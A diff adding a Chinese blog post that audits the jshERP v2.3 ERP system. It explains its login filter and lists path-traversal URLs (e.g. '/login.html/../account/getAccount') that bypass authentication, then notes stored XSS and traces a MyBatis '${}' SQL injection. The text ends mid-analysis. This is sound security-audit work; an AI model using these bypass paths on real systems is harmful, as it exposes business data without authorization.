@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>华夏 ERP CMS v2.3代码审计 - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/%E5%8D%8E%E5%A4%8Fcms/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="华夏 ERP CMS v2.3代码审计">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-26T20:58:47+00:00">
+    <meta property="article:modified_time" content="2025-04-26T20:58:47+00:00">
+    <meta property="article:tag" content="Java">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="华夏 ERP CMS v2.3代码审计">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/%E5%8D%8E%E5%A4%8Fcms/" /><link rel="prev" href="http://localhost:1313/posts/apacheofbiz/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "华夏 ERP CMS v2.3代码审计",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/%E5%8D%8E%E5%A4%8Fcms\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "java","wordcount":  2487 ,
+        "url": "http:\/\/localhost:1313\/posts\/%E5%8D%8E%E5%A4%8Fcms\/","datePublished": "2025-04-26T20:58:47+00:00","dateModified": "2025-04-26T20:58:47+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">华夏 ERP CMS v2.3代码审计</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/javasec/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Javasec</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-04-26">2025-04-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2487 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#审计流程">审计流程</a></li>
+    <li><a href="#未授权访问">未授权访问</a>
+      <ul>
+        <li><a href="#filter-审计">filter 审计</a></li>
+        <li><a href="#未授权分析">未授权分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#xss-代码审计">XSS 代码审计</a></li>
+    <li><a href="#sql-注入">SQL 注入</a></li>
+    <li><a href="#fastjosn-反序列化">fastjosn 反序列化</a></li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="华夏-erp-cms-v23代码审计">华夏 ERP CMS v2.3代码审计</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<p>下载地址：<a href="https://github.com/jishenghua/jshERP/releases/tag/2.3" target="_blank" rel="noopener noreffer ">https://github.com/jishenghua/jshERP/releases/tag/2.3</a></p>
+<p>是个 spring boot 框架，根据配置文件 application.properties 创建数据库，然后导入 sql 文件，最后修改个不冲突的端口。</p>
+<p>利用 navicat 创建数据库并导入 sql 文件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220557375.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220557375.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220557375.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220557375.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220557375.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220557375.png" /></p>
+<p>启动后长这样</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220653550.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220653550.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220653550.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220653550.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220653550.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511220653550.png" /></p>
+<h2 id="审计流程">审计流程</h2>
+<p>在正式进行代码审计前先走一遍代码审计的流程，看 pom.xml 文件，毫无疑问 spring boot 框架</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511221157057.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511221157057.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511221157057.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511221157057.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511221157057.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511221157057.png" /></p>
+<p>数据库操作类用的是 mybatis</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222115152.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222115152.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222115152.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222115152.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222115152.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222115152.png" /></p>
+<p>数据库是 mysql，这我们也是知道的，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222135875.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222135875.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222135875.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222135875.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222135875.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222135875.png" /></p>
+<p>还有就是用来 fastjson 和 swagger2</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222204366.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222204366.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222204366.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222204366.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222204366.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222204366.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222220165.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222220165.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222220165.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222220165.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222220165.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222220165.png" /></p>
+<p>然后再看看路由机制，因为是 spring 框架嘛直接看 controller 文件下，路由机制比较简单，都是放在这个目录下的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222315069.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222315069.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222315069.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222315069.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222315069.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250511222315069.png" /></p>
+<p>看路由机制主要是为了待会方便验证漏洞。</p>
+<h2 id="未授权访问">未授权访问</h2>
+<h3 id="filter-审计">filter 审计</h3>
+<p>这个 cms 是使用的 filter 进行鉴权，来到 filter 模块，通过 init 使得allowUrls 为 <code>/user/login#/user/registerUser#/v2/api-docs</code> 这些路径，然后ignoredUrls 为这些 <code>.css#.js#.jpg#.png#.gif#.ico</code> 后缀的路由</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512135236496.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512135236496.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512135236496.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512135236496.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512135236496.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512135236496.png" /></p>
+<p>猜测这两个变量中的路由应该是不用鉴权，然后继续看 dofilter 方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512165904237.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512165904237.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512165904237.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512165904237.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512165904237.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512165904237.png" /></p>
+<p>第一个是如果获得的 session 中 user 值不为 null 通过验证，然后就是如果请求的是 register.html，login.html，以及 doc.html 也不会进行拦截，还有就是对于 <code>ignoredList</code> 和 <code>allowUrls</code> 变量中的请求路径是不会拦截的。</p>
+<h3 id="未授权分析">未授权分析</h3>
+<p>看来上面分析第一中包含.css 就行了，尝试看能不能通过这种形式进行绕过 <code>.css/../account/getAccount</code>，看到成功再未登录情况下获得了后台数据</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171030818.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171030818.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171030818.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171030818.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171030818.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171030818.png" /></p>
+<p>还可以用第二种情况，通过白名单路径进行路径穿越，同样成功访问了后台信息</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171012320.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171012320.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171012320.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171012320.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171012320.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512171012320.png" /></p>
+<p>更多利用形式</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/login.html/../account/getAccount
+</span></span><span class="line"><span class="cl">/register.html/../account/getAccount
+</span></span><span class="line"><span class="cl">/ch4ser.css/../account/getAccount
+</span></span><span class="line"><span class="cl">/ch4ser.jpg/../account/getAccount
+</span></span><span class="line"><span class="cl">/user/login/../../account/getAccount
+</span></span><span class="line"><span class="cl">/user/registerUser/../../account/getAccount
+</span></span><span class="line"><span class="cl">........</span></span></code></pre></div></div><h2 id="xss-代码审计">XSS 代码审计</h2>
+<p>xss 漏洞说实话没有太好的审计方法，一般是直接在输入框尝试看看，因为上面看到没有 filter 进行过滤，看到基本上随便一个输入框都会弹。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512174933305.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512174933305.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512174933305.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512174933305.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512174933305.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512174933305.png" /></p>
+<p>类似的 xss 还有很多，添加商品处直接储存型 xss。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512175234630.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512175234630.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512175234630.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512175234630.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512175234630.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512175234630.png" /></p>
+<h2 id="sql-注入">SQL 注入</h2>
+<p>刚刚看依赖是使用 mybaits 数据库操作类，搜索关键词</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">%</span><span class="n">$</span><span class="p">{</span><span class="w">  </span><span class="c1">//因为模糊查询不能直接使用%#{}%，所以不会的开发可能会使用%${}%形式，这种就存在sql注入</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">in</span><span class="w"> </span><span class="p">(</span><span class="n">$</span><span class="p">{</span><span class="w">  </span><span class="c1">//使用in (#{}这种形式会报错</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">order</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">$</span><span class="p">{</span><span class="w">  </span><span class="o">//</span><span class="n">order</span><span class="w"> </span><span class="n">by也不能使用预编译</span></span></span></code></pre></div></div><p>直接搜索 <code>%${</code>，搜出来一大堆，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180308386.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180308386.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180308386.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180308386.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180308386.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180308386.png" /></p>
+<p>比如这里进入 <code>AccountMapperEx.xml</code> 文件中，看一下 xml 文件中的信息，第一个红框是命名空间，其实就是绑定的接口，然后第二个红框是方法名称，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512184948167.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512184948167.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512184948167.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512184948167.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512184948167.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512184948167.png" /></p>
+<p>实际开发当中，对应 <code>AccountMapperEx.xml</code> 的一般都是定义在 <code>AccountMapperEx</code> 接口中（如果封装的好的话)，看到这里这个接口内的这些方法都可以造成 sql 注入，因为都用的<code>${}</code>形式</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180830563.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180830563.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180830563.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180830563.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180830563.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512180830563.png" /></p>
+<p>MyBatis 的处理流程一般为</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">controller–&gt;service–&gt;Mapper–&gt;xml文件映射–&gt;执行数据库操作。</span></span></code></pre></div></div><p>所以逆推，接下来就是找 AccountService，看到在其 select 方法中调用了 <code>selectByConditionAccount</code> 方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512185242363.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512185242363.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512185242363.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512185242363.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512185242363.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512185242363.png" /></p>
+<p>查询调用方法只有一个结果，看到参数 name 是通过 map 参数里面拿出来的，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211427468.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211427468.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211427468.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211427468.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211427468.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211427468.png" /></p>
+<p>在该类的 select 进行了调用，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211458828.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211458828.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211458828.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211458828.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211458828.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211458828.png" /></p>
+<p>然后继续逆推，看到貌似是根据 <code>container.getCommonQuery(apiName)</code> 来选择调用哪个类的 select 方法，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211720725.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211720725.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211720725.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211720725.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211720725.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211720725.png" /></p>
+<p>最后来到了 controller，在这里可以进行输入测试，这个 parameterMap 我们完全是可控的，通过 search 参数传入，然后 put 进 map 中，最后 sink 点的 name 等参数就是从 map 中拿出来的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211817507.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211817507.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211817507.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211817507.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211817507.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250512211817507.png" /></p>
